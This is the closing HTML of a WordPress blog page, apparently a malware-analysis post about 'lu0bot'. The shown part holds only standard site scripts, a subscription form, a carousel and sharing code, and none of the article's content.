<li id="menu-item-426"><a href="https://www.youtube.com/channel/UClEmTjO2nLjbwGht-OckQhA"><span class="brand-sm"><i class="fab fa-youtube youtube brand-link"></i></span></a></li>
</ul></nav>					</div>
				</div>

			</footer>
		</div><!-- .wrapper -->
			<script>

	jQuery( document ).ready(function( $ ) {
		const win = $( window );
		const doc = $( document );
		const progressBar = $( 'progress' );
		const progressLabel = $( '.progress-label' );
		const setValue = () => win.scrollTop();
		const setMax = () => doc.height() - win.height();
		const setPercent = () => Math.round( win.scrollTop() / (doc.height() - win.height()) * 100 );
		const pageTitle = $( '#post-title' );
		const pageTitleTop = pageTitle.offset().top;
		const progressBarContainer = $( '.single-post-title-bar' );
		const headerNavBrand = $( '.header .navbar-brand' );
		const progressTitle = $( '#progress-title' );
		const headerBarContainer = $( '.header .container' );

		progressLabel.text( setPercent() + '%' );
		progressBar.attr(
			{
				value: setValue(),
				max: setMax() 
			}
		);

		doc.on( 'scroll', () => {
			progressLabel.text( setPercent() + '%' );
			progressBar.attr(
				{
					value: setValue()
				} 
			);

			if ( doc.scrollTop() > headerNavBrand.height() ) {
				//headerBarContainer.fadeOut( 800 );
				progressTitle.html( pageTitle.html() );
				progressBarContainer.find( '.navbar-brand' ).html( headerNavBrand.html() );
				progressBarContainer.fadeIn( 100 );
				progressBarContainer.addClass( 'fixed-top' );
				progressBarContainer.addClass( 'slide-down' );
			} else {
				//headerBarContainer.fadeIn( 800 );
				progressBarContainer.removeClass( 'slide-down' );
				progressBarContainer.fadeOut( 100 );

				if ( progressBarContainer.hasClass( 'fixed-top' ) ) {
					setTimeout(function() {
						progressBarContainer.removeClass( 'fixed-top' );
					}, 500);
				}
			}
		});

		win.on( 'resize', () => {
			progressLabel.text( setPercent() + '%' );
			progressBar.attr(
				{
					value: setValue(), 
					max: setMax()
				} 
			);
		});

		// Sidebar switcher
		$( '#main-container' ).attr( 'data-previous-class', $( '#main-container' ).attr( 'class' ) );

		$( '.column-control .btn-counter' ).click(function() {
			var target = $( this ).attr( 'data-target' );
			if ( $( this ).hasClass( 'active' ) ) {
				$( this ).removeClass( 'active' );

				if ( target == '#aside-container' ) {
					$( '#main-container' ).attr( 'data-previous-class', $( '#main-container' ).attr( 'class' ) );
					$( '#main-container' ).attr( 'class', 'col col-sm-12' );
					$( '#aside-container' ).hide();
				}
				if ( target == '#sidebar') {
					$( target ).show();
				}
			} else {
				$( this ).addClass( 'active' );

				if ( target == '#aside-container' ) {
					$( '#main-container' ).attr( 'class', $( '#main-container' ).attr( 'data-previous-class' ) );
					$( '#aside-container' ).show();
				}
				if ( target == '#sidebar') {
					$( target ).hide();
				}
			}

		});

		// For responsive.
		$( '.markdown-body img' ).attr('height', '');
	});

	</script>
	<script>

	jQuery( document ).ready(function( $ ) {

		$( '.scroll-area a' ).on( 'click', function(e) {
			e.preventDefault();
			var movingPosition = 0;

			if ( $( this.hash ).offset().top > $( document ).height() - $( window ).height() ) {
				movingPosition = $( document ).height() - $( window ).height();
			} else {
				movingPosition = $( this.hash ).offset().top;
			}

			$( 'html, body' ).animate({
				scrollTop: movingPosition
			}, 500, 'swing' );
		});

		$( 'a.go-top' ).on( 'click' ,function(e) {
			e.preventDefault();
			$( 'html, body' ).animate( { scrollTop: 0 }, 1000 );
		});

		$( window ).scroll( function() {      
			var windowTop =  $( window ).scrollTop();
			if ( windowTop > 100 ) {
				$( 'a.go-top' ).fadeIn( 300 );
			} else {
				$( 'a.go-top' ).fadeOut( 300 );
			}
		});

		$( '#mynote-nav-bar' ).on( 'show.bs.collapse' , function () {
			$( 'body' ).addClass( 'menu-is-collapsed' );
			$( '.main-header' ).css( { 'top': '-60px' } ).animate( { 'top': '0px' }, 500 );
			$( '.has-site-logo .search-bar' ).fadeOut( 500 );
		});

		$( '#mynote-nav-bar' ).on( 'hidden.bs.collapse' , function () {
			$( '.main-header' ).css( { 'top': '0px' } ).animate( { 'top': '-60px' }, 500 );
			$( '.has-site-logo .search-bar' ).fadeIn( 500 );
			setTimeout(function() {
				$( 'body' ).removeClass( 'menu-is-collapsed' );
			}, 500);
			
		});
	});

	</script>
	<!--  -->
<script defer id="bilmur" data-customproperties="{&quot;woo_active&quot;:&quot;0&quot;}" data-provider="wordpress.com" data-service="atomic"  src="https://s0.wp.com/wp-content/js/bilmur.min.js?m=202451"></script>
					<div class="jetpack-subscription-modal">
						<div class="jetpack-subscription-modal__modal-content">
								
	<div class="wp-block-group has-border-color jetpack-subscription-modal__modal-content-form" style="border-color:#dddddd;border-width:1px;margin-top:0;margin-bottom:0;padding:32px"><div class="wp-block-group__inner-container is-layout-flow wp-block-group-is-layout-flow">

		
		<h2 class="wp-block-heading has-text-align-center" style="margin-top:4px;margin-bottom:10px;font-size:26px;font-style:normal;font-weight:600">Discover more from Fumik0_&#039;s box</h2>
		

		
		<p class='has-text-align-center' style='margin-top:4px;margin-bottom:0px;font-size:15px'>Subscribe now to keep reading and get access to the full archive.</p>
		

			<div class="wp-block-jetpack-subscriptions__supports-newline is-style-compact wp-block-jetpack-subscriptions">
		<div class="wp-block-jetpack-subscriptions__container is-not-subscriber">
							<form
					action="https://wordpress.com/email-subscriptions"
					method="post"
					accept-charset="utf-8"
					data-blog="140610880"
					data-post_access_level="everybody"
					data-subscriber_email=""
					id="subscribe-blog"
				>
					<div class="wp-block-jetpack-subscriptions__form-elements">
												<p id="subscribe-email">
							<label
								id="subscribe-field-label"
								for="subscribe-field"
								class="screen-reader-text"
							>
								Type your email…							</label>
							<input
									required="required"
									type="email"
									name="email"
									
									style="font-size: 16px;padding: 15px 23px 15px 23px;border-radius: 50px;border-width: 1px;"
									placeholder="Type your email…"
									value=""
									id="subscribe-field"
									title="Please fill in this field."
								/>						</p>
												<p id="subscribe-submit"
													>
							<input type="hidden" name="action" value="subscribe"/>
							<input type="hidden" name="blog_id" value="140610880"/>
							<input type="hidden" name="source" value="https://fumik0.com/2021/06/24/lu0bot-an-unknown-nodejs-malware-using-udp/"/>
							<input type="hidden" name="sub-type" value="subscribe-block"/>
							<input type="hidden" name="app_source" value="atomic-subscription-modal-lo"/>
							<input type="hidden" name="redirect_fragment" value="subscribe-blog"/>
							<input type="hidden" name="lang" value="en_US"/>
							<input type="hidden" id="_wpnonce" name="_wpnonce" value="c43f937e1f" /><input type="hidden" name="_wp_http_referer" value="/2021/06/24/lu0bot-an-unknown-nodejs-malware-using-udp/" /><input type="hidden" name="post_id" value="3431"/>							<button type="submit"
																	class="wp-block-button__link"
																									style="font-size: 16px;padding: 15px 23px 15px 23px;margin: 0; margin-left: 10px;border-radius: 50px;border-width: 1px;"
																name="jetpack_subscriptions_widget"
							>
								Subscribe							</button>
						</p>
					</div>
				</form>
								</div>
	</div>
	

		
		<p class="has-text-align-center jetpack-subscription-modal__close" style="margin-top:20px;font-size:14px"><a href="#">Continue reading</a></p>
		
	</div></div>
							</div>
					</div>
					<div id="jp-carousel-loading-overlay">
			<div id="jp-carousel-loading-wrapper">
				<span id="jp-carousel-library-loading">&nbsp;</span>
			</div>
		</div>
		<div class="jp-carousel-overlay" style="display: none;">

		<div class="jp-carousel-container">
			<!-- The Carousel Swiper -->
			<div
				class="jp-carousel-wrap swiper-container jp-carousel-swiper-container jp-carousel-transitions"
				itemscope
				itemtype="https://schema.org/ImageGallery">
				<div class="jp-carousel swiper-wrapper"></div>
				<div class="jp-swiper-button-prev swiper-button-prev">
					<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
						<mask id="maskPrev" mask-type="alpha" maskUnits="userSpaceOnUse" x="8" y="6" width="9" height="12">
							<path d="M16.2072 16.59L11.6496 12L16.2072 7.41L14.8041 6L8.8335 12L14.8041 18L16.2072 16.59Z" fill="white"/>
						</mask>
						<g mask="url(#maskPrev)">
							<rect x="0.579102" width="23.8823" height="24" fill="#FFFFFF"/>
						</g>
					</svg>
				</div>
				<div class="jp-swiper-button-next swiper-button-next">
					<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
						<mask id="maskNext" mask-type="alpha" maskUnits="userSpaceOnUse" x="8" y="6" width="8" height="12">
							<path d="M8.59814 16.59L13.1557 12L8.59814 7.41L10.0012 6L15.9718 12L10.0012 18L8.59814 16.59Z" fill="white"/>
						</mask>
						<g mask="url(#maskNext)">
							<rect x="0.34375" width="23.8822" height="24" fill="#FFFFFF"/>
						</g>
					</svg>
				</div>
			</div>
			<!-- The main close buton -->
			<div class="jp-carousel-close-hint">
				<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
					<mask id="maskClose" mask-type="alpha" maskUnits="userSpaceOnUse" x="5" y="5" width="15" height="14">
						<path d="M19.3166 6.41L17.9135 5L12.3509 10.59L6.78834 5L5.38525 6.41L10.9478 12L5.38525 17.59L6.78834 19L12.3509 13.41L17.9135 19L19.3166 17.59L13.754 12L19.3166 6.41Z" fill="white"/>
					</mask>
					<g mask="url(#maskClose)">
						<rect x="0.409668" width="23.8823" height="24" fill="#FFFFFF"/>
					</g>
				</svg>
			</div>
			<!-- Image info, comments and meta -->
			<div class="jp-carousel-info">
				<div class="jp-carousel-info-footer">
					<div class="jp-carousel-pagination-container">
						<div class="jp-swiper-pagination swiper-pagination"></div>
						<div class="jp-carousel-pagination"></div>
					</div>
					<div class="jp-carousel-photo-title-container">
						<h2 class="jp-carousel-photo-caption"></h2>
					</div>
					<div class="jp-carousel-photo-icons-container">
						<a href="#" class="jp-carousel-icon-btn jp-carousel-icon-info" aria-label="Toggle photo metadata visibility">
							<span class="jp-carousel-icon">
								<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
									<mask id="maskInfo" mask-type="alpha" maskUnits="userSpaceOnUse" x="2" y="2" width="21" height="20">
										<path fill-rule="evenodd" clip-rule="evenodd" d="M12.7537 2C7.26076 2 2.80273 6.48 2.80273 12C2.80273 17.52 7.26076 22 12.7537 22C18.2466 22 22.7046 17.52 22.7046 12C22.7046 6.48 18.2466 2 12.7537 2ZM11.7586 7V9H13.7488V7H11.7586ZM11.7586 11V17H13.7488V11H11.7586ZM4.79292 12C4.79292 16.41 8.36531 20 12.7537 20C17.142 20 20.7144 16.41 20.7144 12C20.7144 7.59 17.142 4 12.7537 4C8.36531 4 4.79292 7.59 4.79292 12Z" fill="white"/>
									</mask>
									<g mask="url(#maskInfo)">
										<rect x="0.8125" width="23.8823" height="24" fill="#FFFFFF"/>
									</g>
								</svg>
							</span>
						</a>
												<a href="#" class="jp-carousel-icon-btn jp-carousel-icon-comments" aria-label="Toggle photo comments visibility">
							<span class="jp-carousel-icon">
								<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
									<mask id="maskComments" mask-type="alpha" maskUnits="userSpaceOnUse" x="2" y="2" width="21" height="20">
										<path fill-rule="evenodd" clip-rule="evenodd" d="M4.3271 2H20.2486C21.3432 2 22.2388 2.9 22.2388 4V16C22.2388 17.1 21.3432 18 20.2486 18H6.31729L2.33691 22V4C2.33691 2.9 3.2325 2 4.3271 2ZM6.31729 16H20.2486V4H4.3271V18L6.31729 16Z" fill="white"/>
									</mask>
									<g mask="url(#maskComments)">
										<rect x="0.34668" width="23.8823" height="24" fill="#FFFFFF"/>
									</g>
								</svg>

								<span class="jp-carousel-has-comments-indicator" aria-label="This image has comments."></span>
							</span>
						</a>
											</div>
				</div>
				<div class="jp-carousel-info-extra">
					<div class="jp-carousel-info-content-wrapper">
						<div class="jp-carousel-photo-title-container">
							<h2 class="jp-carousel-photo-title"></h2>
						</div>
						<div class="jp-carousel-comments-wrapper">
															<div id="jp-carousel-comments-loading">
									<span>Loading Comments...</span>
								</div>
								<div class="jp-carousel-comments"></div>
								<div id="jp-carousel-comment-form-container">
									<span id="jp-carousel-comment-form-spinner">&nbsp;</span>
									<div id="jp-carousel-comment-post-results"></div>
																														<form id="jp-carousel-comment-form">
												<label for="jp-carousel-comment-form-comment-field" class="screen-reader-text">Write a Comment...</label>
												<textarea
													name="comment"
													class="jp-carousel-comment-form-field jp-carousel-comment-form-textarea"
													id="jp-carousel-comment-form-comment-field"
													placeholder="Write a Comment..."
												></textarea>
												<div id="jp-carousel-comment-form-submit-and-info-wrapper">
													<div id="jp-carousel-comment-form-commenting-as">
																													<fieldset>
																<label for="jp-carousel-comment-form-email-field">Email (Required)</label>
																<input type="text" name="email" class="jp-carousel-comment-form-field jp-carousel-comment-form-text-field" id="jp-carousel-comment-form-email-field" />
															</fieldset>
															<fieldset>
																<label for="jp-carousel-comment-form-author-field">Name (Required)</label>
																<input type="text" name="author" class="jp-carousel-comment-form-field jp-carousel-comment-form-text-field" id="jp-carousel-comment-form-author-field" />
															</fieldset>
															<fieldset>
																<label for="jp-carousel-comment-form-url-field">Website</label>
																<input type="text" name="url" class="jp-carousel-comment-form-field jp-carousel-comment-form-text-field" id="jp-carousel-comment-form-url-field" />
															</fieldset>
																											</div>
													<input
														type="submit"
														name="submit"
														class="jp-carousel-comment-form-button"
														id="jp-carousel-comment-form-button-submit"
														value="Post Comment" />
												</div>
											</form>
																											</div>
													</div>
						<div class="jp-carousel-image-meta">
							<div class="jp-carousel-title-and-caption">
								<div class="jp-carousel-photo-info">
									<h3 class="jp-carousel-caption" itemprop="caption description"></h3>
								</div>

								<div class="jp-carousel-photo-description"></div>
							</div>
							<ul class="jp-carousel-image-exif" style="display: none;"></ul>
							<a class="jp-carousel-image-download" href="#" target="_blank" style="display: none;">
								<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
									<mask id="mask0" mask-type="alpha" maskUnits="userSpaceOnUse" x="3" y="3" width="19" height="18">
										<path fill-rule="evenodd" clip-rule="evenodd" d="M5.84615 5V19H19.7775V12H21.7677V19C21.7677 20.1 20.8721 21 19.7775 21H5.84615C4.74159 21 3.85596 20.1 3.85596 19V5C3.85596 3.9 4.74159 3 5.84615 3H12.8118V5H5.84615ZM14.802 5V3H21.7677V10H19.7775V6.41L9.99569 16.24L8.59261 14.83L18.3744 5H14.802Z" fill="white"/>
									</mask>
									<g mask="url(#mask0)">
										<rect x="0.870605" width="23.8823" height="24" fill="#FFFFFF"/>
									</g>
								</svg>
								<span class="jp-carousel-download-text"></span>
							</a>
							<div class="jp-carousel-image-map" style="display: none;"></div>
						</div>
					</div>
				</div>
			</div>
		</div>

		</div>
		
	<script type="text/javascript">
		window.WPCOM_sharing_counts = {"https:\/\/fumik0.com\/2021\/06\/24\/lu0bot-an-unknown-nodejs-malware-using-udp\/":3431};
	</script>
				<link rel='stylesheet' id='jetpack-carousel-swiper-css-css' href='https://fumik0.com/wp-content/plugins/jetpack/modules/carousel/swiper-bundle.css?ver=14.2-a.3' type='text/css' media='all' />
<link rel='stylesheet' id='jetpack-carousel-css' href='https://fumik0.com/wp-content/plugins/jetpack/modules/carousel/jetpack-carousel.css?ver=14.2-a.3' type='text/css' media='all' />
<link rel='stylesheet' id='jetpack-block-subscriptions-css' href='https://fumik0.com/wp-content/plugins/jetpack/_inc/blocks/subscriptions/view.css?minify=false&#038;ver=14.2-a.3' type='text/css' media='all' />
<script type="text/javascript" src="https://c0.wp.com/c/6.7.1/wp-includes/js/comment-reply.min.js" id="comment-reply-js" async="async" data-wp-strategy="async"></script>
<script type="text/javascript" src="https://c0.wp.com/c/6.7.1/wp-includes/js/dist/dom-ready.min.js" id="wp-dom-ready-js"></script>
<script type="text/javascript" id="subscription-modal-js-js-extra">
/* <![CDATA[ */
var subscriptionData = {"homeUrl":"fumik0.com"};
/* ]]> */
</script>
<script type="text/javascript" src="https://fumik0.com/wp-content/plugins/jetpack/modules/comments/subscription-modal-on-comment/subscription-modal.js?ver=14.2-a.3" id="subscription-modal-js-js"></script>
<script type="text/javascript" src="https://fumik0.com/wp-content/plugins/jetpack/_inc/build/likes/queuehandler.min.js?ver=14.2-a.3" id="jetpack_likes_queuehandler-js"></script>
<script type="text/javascript" src="https://c0.wp.com/c/6.7.1/wp-includes/js/clipboard.min.js" id="clipboard-js"></script>
<script type="text/javascript" src="https://fumik0.com/wp-content/plugins/highlighting-code-block/assets/js/prism.js?ver=1.2.9" id="hcb-prism-js"></script>
<script type="text/javascript" id="hcb-script-js-extra">
/* <![CDATA[ */
var hcbVars = {"showCopy":"on"};
/* ]]> */
</script>
<script type="text/javascript" src="https://fumik0.com/wp-content/plugins/highlighting-code-block/build/js/hcb_script.js?ver=1.2.9" id="hcb-script-js"></script>
<script type="text/javascript" src="https://stats.wp.com/e-202451.js" id="jetpack-stats-js" data-wp-strategy="defer"></script>
<script type="text/javascript" id="jetpack-stats-js-after">
/* <![CDATA[ */
_stq = window._stq || [];
_stq.push([ "view", JSON.parse("{\"v\":\"ext\",\"blog\":\"140610880\",\"post\":\"3431\",\"tz\":\"0\",\"srv\":\"fumik0.com\",\"hp\":\"atomic\",\"ac\":\"2\",\"amp\":\"0\",\"j\":\"1:14.2-a.3\"}") ]);
_stq.push([ "clickTrackerInit", "140610880", "3431" ]);
/* ]]> */
</script>
<script type="text/javascript" id="jetpack-carousel-js-extra">
/* <![CDATA[ */
var jetpackSwiperLibraryPath = {"url":"https:\/\/fumik0.com\/wp-content\/plugins\/jetpack\/_inc\/build\/carousel\/swiper-bundle.min.js"};
var jetpackCarouselStrings = {"widths":[370,700,1000,1200,1400,2000],"is_logged_in":"","lang":"en","ajaxurl":"https:\/\/fumik0.com\/wp-admin\/admin-ajax.php","nonce":"acafc58171","display_exif":"1","display_comments":"1","single_image_gallery":"1","single_image_gallery_media_file":"","background_color":"black","comment":"Comment","post_comment":"Post Comment","write_comment":"Write a Comment...","loading_comments":"Loading Comments...","image_label":"Open image in full-screen.","download_original":"View full size <span class=\"photo-size\">{0}<span class=\"photo-size-times\">\u00d7<\/span>{1}<\/span>","no_comment_text":"Please be sure to submit some text with your comment.","no_comment_email":"Please provide an email address to comment.","no_comment_author":"Please provide your name to comment.","comment_post_error":"Sorry, but there was an error posting your comment. Please try again later.","comment_approved":"Your comment was approved.","comment_unapproved":"Your comment is in moderation.","camera":"Camera","aperture":"Aperture","shutter_speed":"Shutter Speed","focal_length":"Focal Length","copyright":"Copyright","comment_registration":"0","require_name_email":"1","login_url":"https:\/\/fumik0.com\/wp-login.php?redirect_to=https%3A%2F%2Ffumik0.com%2F2021%2F06%2F24%2Flu0bot-an-unknown-nodejs-malware-using-udp%2F","blog_id":"1","meta_data":["camera","aperture","shutter_speed","focal_length","copyright"]};
/* ]]> */
</script>
<script type="text/javascript" src="https://fumik0.com/wp-content/plugins/jetpack/_inc/build/carousel/jetpack-carousel.min.js?ver=14.2-a.3" id="jetpack-carousel-js"></script>
<script defer type="text/javascript" src="https://fumik0.com/wp-content/plugins/akismet/_inc/akismet-frontend.js?ver=1704837122" id="akismet-frontend-js"></script>
<script type="text/javascript" id="jetpack-blocks-assets-base-url-js-before">
/* <![CDATA[ */
var Jetpack_Block_Assets_Base_Url="https://fumik0.com/wp-content/plugins/jetpack/_inc/blocks/";
/* ]]> */
</script>
<script type="text/javascript" src="https://c0.wp.com/c/6.7.1/wp-includes/js/dist/vendor/wp-polyfill.min.js" id="wp-polyfill-js"></script>
<script type="text/javascript" src="https://fumik0.com/wp-content/plugins/jetpack/_inc/blocks/subscriptions/view.js?minify=false&amp;ver=14.2-a.3" id="jetpack-block-subscriptions-js"></script>
<script type="text/javascript" id="sharing-js-js-extra">
/* <![CDATA[ */
var sharing_js_options = {"lang":"en","counts":"1","is_stats_active":"1"};
/* ]]> */
</script>
<script type="text/javascript" src="https://fumik0.com/wp-content/plugins/jetpack/_inc/build/sharedaddy/sharing.min.js?ver=14.2-a.3" id="sharing-js-js"></script>
<script type="text/javascript" id="sharing-js-js-after">
/* <![CDATA[ */
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-twitter' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-twitter' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-facebook' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-facebook' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
						return false;
					}
				} );
			} )();
/* ]]> */
</script>
	<iframe src='https://widgets.wp.com/likes/master.html?ver=20241218#ver=20241218&#038;n=1' scrolling='no' id='likes-master' name='likes-master' style='display:none;'></iframe>
	<div id='likes-other-gravatars' class='wpl-new-layout' role="dialog" aria-hidden="true" tabindex="-1"><div class="likes-text"><span>%d</span></div><ul class="wpl-avatars sd-like-gravatars"></ul></div>
			<script type="text/javascript">
			(function () {
				const iframe = document.getElementById( 'jetpack_remote_comment' );
								const watchReply = function() {
					// Check addComment._Jetpack_moveForm to make sure we don't monkey-patch twice.
					if ( 'undefined' !== typeof addComment && ! addComment._Jetpack_moveForm ) {
						// Cache the Core function.
						addComment._Jetpack_moveForm = addComment.moveForm;
						const commentParent = document.getElementById( 'comment_parent' );
						const cancel = document.getElementById( 'cancel-comment-reply-link' );

						function tellFrameNewParent ( commentParentValue ) {
							const url = new URL( iframe.src );
							if ( commentParentValue ) {
								url.searchParams.set( 'replytocom', commentParentValue )
							} else {
								url.searchParams.delete( 'replytocom' );
							}
							if( iframe.src !== url.href ) {
								iframe.src = url.href;
							}
						};

						cancel.addEventListener( 'click', function () {
							tellFrameNewParent( false );
						} );

						addComment.moveForm = function ( _, parentId ) {
							tellFrameNewParent( parentId );
							return addComment._Jetpack_moveForm.apply( null, arguments );
						};
					}
				}
				document.addEventListener( 'DOMContentLoaded', watchReply );
				// In WP 6.4+, the script is loaded asynchronously, so we need to wait for it to load before we monkey-patch the functions it introduces.
				document.querySelector('#comment-reply-js')?.addEventListener( 'load', watchReply );

								
				const commentIframes = document.getElementsByClassName('jetpack_remote_comment');

				window.addEventListener('message', function(event) {
					if (event.origin !== 'https://jetpack.wordpress.com') {
						return;
					}

					if (!event?.data?.iframeUniqueId && !event?.data?.height) {
						return;
					}

					const eventDataUniqueId = event.data.iframeUniqueId;

					// Change height for the matching comment iframe
					for (let i = 0; i < commentIframes.length; i++) {
						const iframe = commentIframes[i];
						const url = new URL(iframe.src);
						const iframeUniqueIdParam = url.searchParams.get('iframe_unique_id');
						if (iframeUniqueIdParam == event.data.iframeUniqueId) {
							iframe.style.height = event.data.height + 'px';
							return;
						}
					}
				});
			})();
		</script>
		
		<a href="javascript:void(0);" class="go-top" style="display: none">
			<i class="fas fa-arrow-up"></i>
		</a>
	</body>
</html>
